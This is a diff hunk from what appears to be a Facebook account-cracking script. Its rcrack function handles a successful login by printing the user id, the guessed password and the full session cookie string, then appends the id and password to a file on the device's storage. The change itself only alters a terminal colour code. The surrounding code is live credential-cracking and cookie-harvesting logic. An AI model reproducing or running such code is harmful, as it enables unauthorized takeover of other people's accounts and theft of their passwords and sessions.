@@ -311,7 +311,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;92m [𝗕𝗥𝗢𝗧𝗛𝗘𝗥-𝗢𝗞🥰] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🌺= \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[0;34m [𝗕𝗥𝗢𝗧𝗛𝗘𝗥-𝗢𝗞🥰] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🌺= \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/KHAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
